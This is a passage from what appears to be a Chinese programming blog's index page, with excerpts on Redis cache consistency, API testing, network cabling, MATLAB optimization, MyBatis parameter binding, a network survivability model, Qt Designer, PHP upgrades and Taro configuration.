			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天突然想起来这个，就是那么突然，上次项目上用过redis，是一个消息已读未读的问题，由于消息挺多的，如果每次都去查数据库，那岂不是裂开，所以就存缓存了。
现在想想，还是不大行，我看表里已经十万数据了，而且都不怎么用，如果火力全开，可能一天就得1w+的数据。
所以，我认为，更具不同的区域进行分表，然后在存入redis，通过不同的区域key。(没有什么事情是加一层解决不了的，如果有，就再加一层！)
回归正题哈，扯了一会淡（反正也就我自己复习的时候看看博客，无所吊谓！）
既然是同步redis和数据库（以下以修改数据为例子），就有两个情况： 到底是先修改数据库，还是先改redis 我认为，不管是先更新哪一个，都会出现问题(没加锁前提下)：
先更新数据库会出现：数据库刚更新完，还没更新redis，就有访问，导致取redis的旧数据。
先更新redis会出现：redis更新成功，一个线程在更新数据库之前去到了redis拿去用了，可是，更新数据库时报错了！这个数据就是错数据，玩球了！
最好的方法还是先改数据库，然后删掉缓存，之所以删掉缓存而不是修改缓存，是因为有些缓存不会经常用，所以用到它的时候去除，存入缓存。
所以，直接加锁，（性能降低一些，保证数据安全性），只要我的两个操作没有完，就不能访问。 还可以用版本号（乐观锁）来解决，redis和数据库两边的版本号是否相同，一旦不相同就不读取还在更新redis缓存。
另外一种就是利用消息队列来解决也就是成了异步更新，一旦更新数据库成功，就向消息队列中发送一条更新消息，消费者拿到后进行更新redis，如果失败就重试。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7fa87d320581bb79a6df59878ac66195/" rel="bookmark">
			接口测试和功能测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文主要分为两个部分：
第一部分：主要从问题出发，引入接口测试的相关内容并与前端测试进行简单对比，总结两者之前的区别与联系。但该部分只交代了怎么做和如何做？并没有解释为什么要做？
第二部分：主要介绍为什么要做接口测试，并简单总结接口持续集成和接口质量评估相关内容。
第一部分 首先，在做接口测试的过程中，经常有后端开发会问：
后端接口都测试什么？怎么测的？后端接口测试一遍 ，前端也测试一遍，是不是重复测试了？ 于是，为了向开发解释上述问题，普及基本的测试常识，特意梳理了接口测试的相关内容以及其与前端测试的区别，使开发团队与测试团队在测试这件上达成基本的共识，提高团队协作效率，从而更好的保证产品质量。
然后，我们试着回答上面的问题：
问题1.1、后端接口都测试什么？
回答这个问题，我们可以从接口测试活动内容的角度下手，看一下面这张图，基本反应了当前我们项目后端接口测试的主要内容：
问题1.2、我们怎么做接口测试？
由于我们项目前后端调用主要是基于http协议的接口，所以测试接口时主要是通过工具或代码模拟http请求的发送与接收。工具有很多如：postman、jmeter、soupUI、java+httpclient、robotframework+httplibrary等。
问题2、后端接口测试一遍 ，前端也测试一遍，是不是重复测试了？
回答这个问题，我们可以直接对比接口测试和app端测试活动的内容，如下图为app测试时需要覆盖或考虑内容：
从上面这两张图对比可以看出，两个测试活动中相同的部分有功能测试、边界分析测试和性能测试，其它部分由于各自特性或关注点不同需要进行特殊的测试，在此不做讨论。接下来我们针对以上三部分相同的内容再进行分析：
1、基本功能测试：
由于是针对基本业务功能进行测试，所以这部分是两种测试重合度最高的一块，开发同学通常所指的也主要是这部分的内容。
2、边界分析测试：
在基本功能测试的基础上考虑输入输出的边界条件，这部分内容也会有重复的部分（比如业务规则的边界）。但是，前端的输入输出很多时候都是提供固守的值让用户选择（如下拉框），在这种情况下测试的边界范围就非常有限，但接口测试就不存在这方面的限制，相对来说接口可以覆盖的范围更广，同样的，接口出现问题的概率也更高。
3、性能测试：
这个比较容易区分，虽然都需要做性能测试，但关注点确大不相同。App端性能主要关注与手机相关的特性，如手机cpu、内存、流量、fps等。而接口性能主要关注接口响应时间、并发、服务端资源的使用情况等。两种测试时的策略和方法都有很大区别，所以这部分内容是需要分开单独进行测试的，理论上来说这也是不同的部分。
综论：
1、接口测试和app测试的活动有部分重复的内容，主要集中在业务功能测试方面。除此之外，针对各自特性的测试都不一样，需要分别进行有针对性的测试，才能确保整个产品的质量。
2、接口测试可以关注于服务器逻辑验证，而UI测试可以关注于页面展示逻辑及界面前端与服务器集成验证
在这我为大家准备了一份软件测试视频教程（含面试、接口、自动化、性能测试等），就在下方，需要的可以直接去观看，也可以直接【点击文末小卡片免费领取资料文档】
软件测试视频教程观看处：
2024年Python自动化测试全套保姆级教程，70个项目实战，3天练完，永久白嫖...
第二部分 1、什么是接口测试？
接口测试是测试系统组件间接口的一种测试。接口测试主要用于检测外部系统与系统之间以及内部各个子系统之间的交互点。测试的重点是要检查数据的交换，传递和控制管理过程，以及系统间的相互逻辑依赖关系等。
2、为什么要做接口测试?
a) 如今的系统复杂度不断上升，传统的测试方法成本急剧增加且测试效率大幅下降，接口测试可以提供这种情况下的解决方案。
b) 接口测试相对容易实现自动化持续集成，且相对UI自动化也比较稳定，可以减少人工回归测试人力成本与时间，缩短测试周期，支持后端快速发版需求。接口持续集成是为什么能低成本高收益的根源。
c) 现在很多系统前后端架构是分离的，从安全层面来说：
1、只依赖前端进行限制已经完全不能满足系统的安全要求（绕过前面实在太容易）， 需要后端同样进行控制，在这种情况下就需要从接口层面进行验证。
2、前后端传输、日志打印等信息是否加密传输也是需要验证的，特别是涉及到用户的隐私信息，如身份证，银行卡等。
3、接口测试持续集成：
对接口测试而言，持续集成自动化是核心内容，通过持自动化的手段我们才能做到低成本高收益。目前我们已经实现了接口自动化，主要应用于回归阶段，后续还需要加强自动化的程度，包括但不限于下面的内容：
a) 流程方面：在回归阶段加强接口异常场景的覆盖度，并逐步向系统测试，冒烟测试阶段延伸，最终达到全流程自动化。
b) 结果展示：更加丰富的结果展示、趋势分析，质量统计和分析等
c) 问题定位：报错信息、日志更精准，方便问题复现与定位。
d) 结果校验：加强自动化校验能力，如数据库信息校验。
e) 代码覆盖率：不断尝试由目前的黑盒向白盒下探，提高代码覆盖率。
f) 性能需求：完善性能测试体系，通过自动化的手段监控接口性能指标是否正常。
4、接口测试质量评估标准：
a) 业务功能覆盖是否完整
b) 业务规则覆盖是否完整
c) 参数验证是否达到要求（边界、业务规则）
d) 接口异常场景覆盖是否完整
e) 接口覆盖率是否达到要求
f) 代码覆盖率是否达到要求
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7fa87d320581bb79a6df59878ac66195/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1cb6f1d67d12f63854fc7adf7fba12d2/" rel="bookmark">
			计网04-网络传输介质
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		物理层（网卡、传输介质）
一、信号 １、概念 进行网络通信在线缆中传输的就是信号，网线传输电信号，光纤传输光信号。
信息：对现实事物存在的某种认识数据：描述某些属性的具体的量子，比如人的身高，体重，性别等信号：传递信息的媒介 ２、分类 模拟信号：用来表示连续变化的物理量所表达的信息。温度、电流、电压等数字信号：变量是离散的，在计算机中数字信号的　大小常用有限位的二进制表示 二、传输介质 １、同轴电缆 广泛应用在有线电视上同轴电缆＋有线猫用在网络上传输，最高速率只能达到10Ｍbps ２、双绞线 &lt;1&gt; 双绞线简介 双绞线也称以太网接口、Ｒj-45接口（水晶头），在局域网使用最为广泛，它有传输速率高、应用广泛、成本低等特点。
屏蔽双绞线：主要应用于电磁干扰强的场景，如电站非屏蔽双绞线：主要应用于没有电磁干扰的场景 &lt;2&gt; 连接规范 T568A：白绿、绿、白橙、蓝、白蓝、橙、白棕、棕T568B：白橙、橙、白绿、蓝、白蓝、绿、白棕、棕（目前现实生活中最常用的线序） &lt;3&gt; 双绞线连接 现在使用的一般都是T568B的双绞线，T568A的双绞线和交叉网线没有被广泛使用。
标准网线：两边都是568A或568B的网线交叉网线：一边568A一边是568B全反线：Console线一边是网线接口一边是com口 a . 关于交叉网线的原理 在早期的时候，生产厂商的接口没有办法自动转换，网线是有发送有接收的，一根网线实际上里面四根线通了就能使用。
568B 白橙、　橙、　白绿、　蓝、　白蓝、　绿、　白棕、　棕
发送＋　发送-　接收＋　无　无　接收－　无　无
568A 接收＋　接收－　发送＋　无　无　发送－　无　无
白绿　绿　白橙　蓝　白蓝　橙　白棕　棕
这种线路就是交叉网线，早期厂商设备没有自动转换信道的功能所以同一层设备连的时候就必须使用交叉线，就比如路由器和路由器连就必须用交叉线，电脑和电脑连就必须用交叉线，交换机和交换机连就必须用交叉线。
如果是电脑和交换机连，就不用交叉线，就用直通线，因为电脑和交换机属于不同层的设备，所以它会有一个自动转换的过程，但是同层的设备就没办法自动转，所以说需要用交叉线。
现在的设备全部都满足自适应的功能，接口基本都是自适应的。所以交叉线就用的比较少了。
&lt;4&gt; 常见的双绞线 Cat.5：传输最高带宽为100MHz，因未加入PS NEXT等指标，故无法支持1000Base-T，现已被淘汰。Cat.5e：传输最高带宽为100MHz，一种比Cat.5更好性能的电缆，改善了诸如PS NEXT、PS ELFEXT，支持1000Base-T。Cat.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1cb6f1d67d12f63854fc7adf7fba12d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/802e7a489594760e0edb498b5f5c91a7/" rel="bookmark">
			优化模型：MATLAB非线性规划
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、非线性规划 1.1 非线性规划的定义 非线性规划（Nonlinear Programming，NLP） 是一种数学规划方法，用于解决含有非线性目标函数和/或非线性约束条件的优化问题。它是线性规划的一种扩展形式，更加广泛适用于复杂实际问题。
非线性规划的目标是最小化（或最大化）一个非线性目标函数，同时满足一组非线性约束条件。这些非线性函数可以是任意形式的，例如多项式、指数函数、对数函数等。非线性规划的决策变量可以是连续的或离散的，具体取决于问题的性质。
与线性规划相比，非线性规划更具挑战性，因为非线性函数的存在使得问题的求解变得更加困难。非线性优化问题往往没有显式解，需要使用迭代算法逐步优化。常用的求解方法包括牛顿法、梯度下降法、拟牛顿法、遗传算法等。
1.2 非线性规划的数学模型 min ⁡ f ( x ) \min f\left( \boldsymbol{x} \right) minf(x)
s . t . { A ⋅ x ⩽ b A e q ⋅ x = b e q c ( x ) ⩽ 0 c e q ( x ) = 0 l b ⩽ x ⩽ u b s.t.\left\{ \begin{array}{c} \boldsymbol{A}\cdot \boldsymbol{x}\leqslant \boldsymbol{b}\\ Aeq\cdot \boldsymbol{x}=beq\\ c\left( \boldsymbol{x} \right) \leqslant 0\\ ceq\left( \boldsymbol{x} \right) =0\\ lb\leqslant \boldsymbol{x}\leqslant ub\\ \end{array} \right.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/802e7a489594760e0edb498b5f5c91a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5437edd3bde46ca5e64f1bd2e88b71f6/" rel="bookmark">
			使用SftpDrive &#43; SourceInsight阅读远程服务器代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在虚拟机环境下使用Linux编写和阅读代码，我之前一直是通过Xshell利用ssh登录至虚拟机从而在命令行下使用vim来进行的。目前有阅读开源代码的需要，虽然vim+ctags+cscope可以完成这项工作，不过对我来说毕竟还是用鼠标操作窗口更容易入门，因此希望能在Windows环境下阅读和修改Linux虚拟机的开源代码。
能完成这个要求的途经不少，这里介绍一个比较简单的方式：SftpDrive+SourceInsight。其中SftpDrive用于将SSH服务器映射为Windows网络驱动器，而SourceInsight用于代码阅读和编写，这里的代码以Nginx源码为例（实际设置时并无区别）。
由于SftpDrive使用的是SSH，因此映射的对象不仅限于虚拟机。同时在使用前请确保欲映射的目标的SSH服务已开启，然后启动SftpDrive，如下图中进行设置：
为了能获得所有目录的完全修改权限，建议使用root进行登录，并且显示的文件夹选择"Show the entire server"。不过此后进行删除和修改操作时要格外小心。
设置完毕并Connect，可以看到计算机中多出了一个盘符，这时就可以像操纵本地文件一样读写虚拟机里的文件了。
更近一步地，可以使用SourceInsight对源码进行查看和修改。由于SourceInsight的介绍文章很多，下面仅以Nginx1.4.2的源码为例简单介绍一下。
进入SourceInsight，选择Project-&gt;New Project，输入项目名和项目数据存放目录（不是源码目录，最好用本地目录）：
接下来才是选择源码所在目录：
这时选择Add Tree就可以了。注意有时使用Add Tree可能无法添加文件，如果确保过滤选项无误，可以重启计算机再试试。
附录：
SftpDrive 官方下载地址：SFTP Drive | Download Options
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e27fc90b8e25868712fdb7df6c65680/" rel="bookmark">
			刘二大人《PyTorch深度学习实践》p9多分类问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		刘二大人《PyTorch深度学习实践》p9多分类问题 一、零碎知识点1.LongTensor长整形张量2.transform结构及用法 二、预备知识1.Softmax激活函数2.NLLLoss损失函数3.CrossEntropyLoss()4.随堂练习CrossEntropyLoss vs NLLLoss 三、课程代码1.函数名问题导致的运行错误2.课程代码 一、零碎知识点 1.LongTensor长整形张量 torch.LongTensor是一种用于表示整数类型的张量（tensor）。
2.transform结构及用法 from torchvision import transforms transform = transforms.Compose([ transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,)) # 归一化 # 均值0.1307 标准差0.3081 ]) transforms.Compose函数
将多个转换操作组合成一个序列（pipeline），并按顺序依次对数据进行转换。transforms.ToTensor()
这个操作将图像数据从原始的PIL.Image对象转换为torch.Tensor对象，将图像数据的像素值从范围0-255缩放到范围0-1之间。transforms.Normalize()
这个操作对图像数据进行归一化处理，MNIST手写数据集其均值为0.1307，标准差为0.3081。归一化操作通过减去均值，并将结果除以标准差来完成。 二、预备知识 1.Softmax激活函数 Softmax是一种常用的激活函数，常用于多类别分类问题中。
Softmax函数将原始的实数向量转换为表示概率分布的向量，使每个元素的取值范围≥0，并且所有元素的和等于1。
Softmax函数的定义如下：
对于输入向量 z = ( z 1 , z 2 , … , z k − 1 ) \mathbf{z} = (z_1, z_2, \ldots, z_{k-1}) z=(z1​,z2​,…,zk−1​)，Softmax函数对应的输出向量 y = ( y 1 , y 2 , … , y n ) \mathbf{y} = (y_1, y_2, \ldots, y_n) y=(y1​,y2​,…,yn​) 的计算公式为：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e27fc90b8e25868712fdb7df6c65680/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91f5ab3bc669b6a8a065560e7d024e6f/" rel="bookmark">
			MyBatis多表查询及参数赋值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一.多表查询
二.Mybatis参数赋值#{}和${}
1.区别
2.需要使用$的场景
排序打印
模糊查询
三.数据库连接池
Mybatis持久层框架：操作数据库的框架，方便对数据进行增删改查。
实现：注解、xml
实际开发中这两种方式可以共存。
工作中尽可能的避免使用多表查询，尤其是对性能要求非常高的项目。
一.多表查询 准备两个表，文章表和用户表
根据文章ID，获取作者相关信息
通过MySQL数据库关联两者
通过mybatis的方式实现多表查询
创建数据库字段与Java对象的映射
创建操作类ArticleInfoMapper，在这个类中实现对数据库的操作，根据这个类中的方法自动生成操作方法测试类ArticleInfoMapperTest。
单表查询
多表查询
打印不完整的原因是Java对象中不存在userinfo和age两个属性
在Java对象定义中加上后即可
SQL中直接查询多个表，把查询结果放在一个对象即可
二.Mybatis参数赋值#{}和${} 1.区别 mybatis的参数赋值有两种方式，下介绍#{}和${}两者的区别。
赋值为Integer类型时：
赋值为字符串类型时：
把${}外加上引号，运行成功：
使用#时，如果参数为Srting会自动加上引号。
$不会自动加上引号，$是直接拼接，如果是字符串类型，需要加上引号'${}'
SQL执行的顺序：语法解析、SQL优化、SQL执行
区别：
1）最根本的区别：$存在的漏洞：SQL注入 SQL注⼊：是通过操作输⼊的数据来修改事先定义好的SQL语句，以达到执⾏代码对服务器进行攻 击的方法。（例如：输入数据时自动添加引号产生的引号配对与原意不符） 2）预编译SQL和即时SQL的区别 1.预编译SQL性能更高。编译一次之后会把编译后的SQL语句缓存起来，后面再次执行这条语句 时，不会再次编译（只是输入的参数不同），省去了解析优化的过程，以此来提高效率。 2.预编译SQL不存在SQL注入的问题 3)更细致的几点 排序时不能使用 # 表名、字段名作为参数时也不能使用 # 模糊查询时如果使用#，需要搭配MySQL的内置函数contact，而不能直接使用。 实际开发中能使用 # 的，尽量都使用 # 2.需要使用$的场景 排序打印 SQL语句中的降序和升序，desc和esc本身不需要带引号，#会自动添加引号，程序就会报错，所以只能使用$.
模糊查询 模糊查询使用#的方式
三.数据库连接池 数据库连接池负责分配、管理和释放数据库连接，它允许应用程序重复使用一个现有的数据库连接，而不是重新创建一个。
目前比较流行数据库连接池的是 Hikari, Druid Hikari：SpringBoot默认使用的数据库连接池 如果想把默认的数据库连接池切换为Druid数据库连接池，只需要引入相关依赖即可 &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.17&lt;/version&gt; &lt;/dependency&gt; Hikari性能更好, Druid功能更强大。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c769be462ecbfc3ec3a5985e361987e6/" rel="bookmark">
			12-网络安全框架及模型-网络生存模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
网络生存模型
1 背景概述
2 主要内容
3 系统划分
4 攻击模式分析
5 正常服务模式定义
6 入侵模式分析
7 基本功能和关键信息保护
8 应用场景
9 优势和局限性
网络生存模型 1 背景概述 网络生存模型是指在网络信息系统遭受攻击或故障的情况下，评估网络信息系统能够继续提供必要服务的能力的模型。该模型主要关注网络信息系统的可靠性、稳定性和安全性等方面，旨在提高网络系统的生存能力和可靠性。
目前，国际上通用的网络生存模型遵循“3R”的建立方法，即划分系统为不可攻破的安全核和可恢复部分，对一定的攻击模式给出相应的抵抗（Resistance）、识别（Recognition）和恢复（Recovery）策略，定义网络信息系统应具备的正常服务模式和可能被黑客利用的入侵模式，给出系统需要重点保护的基本功能服务和关键信息等。
网络生存模型的核心思想是“深度防御”，包括人、技术、操作三个要素，以及保护网络和基础设施、保护区域边界、保护计算环境、支持性基础设施四个焦点领域。这种模型将信息网络安全防护措施有机组合起来，针对保护对象，部署合适的安全措施，形成多道保护线，各安全防护措施能够相互支持和补救，尽可能地阻断攻击者的威胁。
在网络生存模型的研究方面，马里兰大学结合入侵检测提出了生存性的屏蔽、隔离和重放等方法，对防止攻击危害的传播和干净的数据备份等方面进行了有益的探讨。美国CERT、DoD等组织都开展了有关研究项目，如DARPA已启动容错网络（FaultNetwork）研究计划。
综上所述，网络生存模型是一种评估网络信息系统生存能力的模型，通过遵循“3R”的建立方法，实现网络系统的可靠性和稳定性。
2 主要内容 网络生存模型主要关注网络信息系统在遭受攻击或故障的情况下，仍能持续提供必要服务的能力。该模型的主要内容包括以下几个方面：
系统划分：将网络系统划分为不可攻破的安全核和可恢复部分。安全核是网络系统中最核心的部分，必须保证其安全性和可靠性，而可恢复部分则是为了应对攻击和故障所做的额外保障。
攻击模式分析：分析可能对网络系统造成威胁的攻击模式，包括拒绝服务攻击、病毒、蠕虫、特洛伊木马等。针对这些攻击模式，制定相应的抵抗（Resistance）、识别（Recognition）和恢复（Recovery）策略。
正常服务模式定义：定义网络信息系统应具备的正常服务模式，包括服务类型、服务级别等，以便评估网络系统的性能和可用性。
入侵模式分析：分析可能被黑客利用的入侵模式，包括恶意代码植入、数据篡改、敏感信息泄露等。了解入侵模式的手段和目的，有助于更好地制定安全策略和防护措施。
基本功能服务和关键信息保护：确定网络信息系统需要重点保护的基本功能服务和关键信息，如数据传输、存储和处理等，制定相应的安全策略和防护措施，确保这些服务和信息的安全性和完整性。
此外，网络生存模型还强调了“深度防御”的策略，包括人、技术、操作三个要素，以及保护网络和基础设施、保护区域边界、保护计算环境、支持性基础设施四个焦点领域。这种策略将信息网络安全防护措施有机组合起来，针对保护对象，部署合适的安全措施，形成多道保护线，各安全防护措施能够相互支持和补救，尽可能地阻断攻击者的威胁。
3 系统划分 网络生存性模型的系统划分是为了将系统划分为不同的安全等级和恢复能力，以便更好地管理和保护网络信息系统。系统划分通常包括以下几个步骤：
确定系统重要性和业务需求：首先需要确定网络信息系统的重要性和业务需求，了解系统的关键功能和业务目标，以便为系统划分提供依据。
识别关键资源和资产：对网络信息系统中的关键资源、资产和数据进行识别和分类，了解其价值和重要性，以便为后续的系统划分提供依据。
划分安全等级和恢复能力：根据关键资源和资产的重要性和业务需求，将系统划分为不同的安全等级和恢复能力。安全等级高的区域需要具备更强的安全防护措施，恢复能力强的区域需要具备快速恢复的能力。
制定安全策略和防护措施：针对不同的安全等级和恢复能力，制定相应的安全策略和防护措施，包括访问控制、数据备份、容灾恢复等。
监控和维护：对系统的运行状态和安全状况进行实时监控和维护，及时发现和处理安全事件和故障，确保系统的正常运行和安全性。
在网络生存性模型的系统划分中，还需要注意以下几点：
系统划分需要与业务需求相匹配，确保系统的正常运行和业务的连续性。
系统划分需要考虑不同安全域之间的互操作性，确保不同安全域之间的通信和数据交换的安全性。
系统划分需要具备足够的灵活性和可扩展性，以便应对未来业务发展和技术变化的需求。
系统划分需要充分考虑现有网络架构和资源状况，尽可能地利用现有设备和资源，降低成本和维护难度。
4 攻击模式分析 攻击模式分析是网络生存模型中非常重要的一个环节，它主要是对可能对网络系统造成威胁的攻击模式进行深入的分析和理解。通过对攻击模式的识别和研究，可以更好地制定相应的防御策略和恢复措施，提高网络系统的生存能力。
攻击模式分析主要包括以下几个方面：
攻击类型分析：分析可能对网络系统造成威胁的攻击类型，包括拒绝服务攻击、病毒、蠕虫、特洛伊木马等。了解不同攻击类型的原理、手段和影响范围，有助于更好地制定防御策略。
攻击路径分析：分析攻击者可能采取的攻击路径，包括网络流量分析、漏洞扫描、社会工程学攻击等。了解攻击路径有助于更好地制定安全防护措施，阻断攻击者的威胁。
攻击模式演变分析：随着技术的发展和攻击手段的演变，攻击模式也在不断变化。因此，需要持续跟踪和研究攻击模式的演变趋势，以便及时调整和更新防御策略。
漏洞管理：分析网络系统中的漏洞和弱点，及时发现和修复漏洞，避免被攻击者利用。漏洞管理是提高网络系统安全性的重要措施之一。
威胁情报：收集和分析与网络系统相关的威胁情报，包括恶意软件样本、攻击源、攻击手法等，以便更好地了解攻击者的行为和意图，制定更有效的防御策略。
在进行攻击模式分析时，需要注意以下几点：
攻击模式分析需要与实际业务场景相结合，了解业务需求和安全目标，以便更好地制定相应的防御策略。
攻击模式分析需要综合考虑技术和人两个因素，不仅需要关注技术层面的防御，还需要关注人员安全意识的提高和管理制度的完善。
攻击模式分析需要持续进行，随着技术的变化和攻击手段的演变，需要不断更新和分析攻击模式，以便及时调整和更新防御策略。
攻击模式分析需要多方面的合作和支持，包括安全厂商、研究机构、安全社区等，共同研究和应对网络安全威胁。
5 正常服务模式定义 正常服务模式定义是网络生存模型中的重要组成部分，主要目的是明确网络信息系统应具备的正常服务模式，以便评估系统的性能和可用性。
正常服务模式定义主要包括以下几个方面：
服务类型定义：确定网络信息系统提供的服务类型，包括数据传输、数据存储、数据处理等。针对不同的服务类型，制定相应的性能指标和服务质量要求。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c769be462ecbfc3ec3a5985e361987e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa9a280935b699dcf8a504a7852d63e2/" rel="bookmark">
			Qt designer设计UI实例：双视图立体匹配与重建的可视化UI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PyQt5和Qt designer的详细安装教程：https://blog.csdn.net/qq_43811536/article/details/135185233?spm=1001.2014.3001.5501Qt designer界面和所有组件功能的详细介绍：https://blog.csdn.net/qq_43811536/article/details/135186862?spm=1001.2014.3001.5501 目录 1. 实例：双视图立体匹配与重建的可视化UI2. 一个简单的UI展示3. 设计流程3.1 设计大纲3.2 UI 设计3.2.1 静态文本3.2.2 划定UI的主要区域3.2.3 功能区分块3.2.4 用户交互区3.2.5 结果可视化窗口 4. 自定义UI中组件的功能 1. 实例：双视图立体匹配与重建的可视化UI 输入：一对左右眼视图的图像。任务：对输入的一对带相机参数的左右眼图像数据，实现SAD、NCC 两种局部的立体匹配方法进行重建。输出： 基本的交互界面供用户选择立体匹配算法以及输入的图片。将每种立体匹配方法所用的时间以及图片大小信息显示出来。可视化重建的结果，如点云，深度图，视差图等，可以使用Meshlab 软件
或者Open3D 进行可视化 2. 一个简单的UI展示 针对上述实例要求，设计了一个简单的符合要求的UI如下图所示。界面包含图片选择（Picture）、匹配算法选择（Matching algorithm）、成本函数选择（Matching cost）、运行按钮（Run）、图片显示窗口（Picture visualization）、结果显示窗口（Results display）和输出信息窗口（Output information）。
3. 设计流程 3.1 设计大纲 根据实例要求，一个最简单的UI包括“功能展示”、“用户交互区”以及“结果可视化窗口”。功能展示：可以通过一个醒目的标题以及有序的操作步骤来告诉用户这个UI界面的主要功能是什么，还可以引导用户在没有任何先验知识的情况下按步骤操作。用户交互区：这部分类似于软件UI的导航栏，不过为了简单期间不需要设计过于复杂，按照一般的操作习惯，我们可以把用户交互区放在UI的左边，然后将有序的操作步骤依次分块呈现即可。功能区分块可以通过Containers里的Group Box实现。结果可视化窗口：结果可视化区域应该占绝对主要的面积，可以放在UI右半边。分三部分——当前双视图可视化、重建结果可视化以及文本信息输出。 3.2 UI 设计 3.2.1 静态文本 UI中的静态文本可以使用Display Widgets中的Label组件：
1：将Label小组件单击拖动到设计窗口Form中；2：右键当前的组件 → \rightarrow →选择 改变多信息文本 → \rightarrow →输入静态文本内容、修改期望的格式（字体、大小、布局等）。 3.2.2 划定UI的主要区域 可以使用Containers中的Scroll Area组件，好处是如果内容超出区域会自动在边界生成滑动条：
手动拉伸边界调节区域大小。 3.2.3 功能区分块 可以使用Containers中的Group Box组件：
1：将Group Box小组件单击拖动到设计窗口Form中，双击左上角的文本修改功能区命名；2：右键当前的组件 → \rightarrow →选择 改变样式表；3：点击添加字体修改功能区命名期望的格式（字体、大小等）。 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa9a280935b699dcf8a504a7852d63e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6239b6f30fe2c63d166b0e62149d5023/" rel="bookmark">
			Linux 服务器中 PHP 版本从 5.x 升级到 7.x
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果把 Linux 服务器的 PHP 版本升级呢？比如目前版本是 PHP 5.6.40，升级到7.4 当前最最新版本 PHP 7.4.30。
查看当前 PHP 版本 php -v
卸载已安装的 PHP yum remove php-common
安装 EPEL 源 yum install epel-release
如果已安装过，则提示如下：
安装 remi 源 yum install http://rpms.remirepo.net/enterprise/remi-release-7.rpm
安装 yum-config-manager yum install yum-utils
指定 remi 的php 7.4 仓库 yum-config-manager --enable remi-php74
注意：如果要安装其它 PHP 版本，可以把上面命令中的 remi-php74 改为 remi-php72、remi-php71、remi-php70 等。
输出结果：
[root@langlang ~]# yum-config-manager --enable remi-php74 Loaded plugins: fastestmirror ============================================================ repo: remi-php74 ============================================================ [remi-php74] async = True bandwidth = 0 base_persistdir = /var/lib/yum/repos/x86_64/7 baseurl = cache = 0 cachedir = /var/cache/yum/x86_64/7/remi-php74 check_config_file_age = True compare_providers_priority = 80 cost = 1000 deltarpm_metadata_percentage = 100 deltarpm_percentage = enabled = 1 enablegroups = True exclude = failovermethod = priority ftp_disable_epsv = False gpgcadir = /var/lib/yum/repos/x86_64/7/remi-php74/gpgcadir gpgcakey = gpgcheck = True gpgdir = /var/lib/yum/repos/x86_64/7/remi-php74/gpgdir gpgkey = file:///etc/pki/rpm-gpg/RPM-GPG-KEY-remi hdrdir = /var/cache/yum/x86_64/7/remi-php74/headers http_caching = all includepkgs = ip_resolve = keepalive = True keepcache = False mddownloadpolicy = sqlite mdpolicy = group:small mediaid = metadata_expire = 21600 metadata_expire_filter = read-only:present metalink = minrate = 0 mirrorlist = http://cdn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6239b6f30fe2c63d166b0e62149d5023/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ceb1b7fcede733a2012cf938645af891/" rel="bookmark">
			taro小程序指定@代表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.ts.config.json
"paths": { "@/*": ["./src/*"] } config/index.js
const path = require('path') alias: { '@': path.resolve(__dirname, '..', 'src') }, 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d568c0775d5099a01c84ddab6acef2a2/" rel="bookmark">
			若依 el-upload 上传execl 导入后 返回错误数据excel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
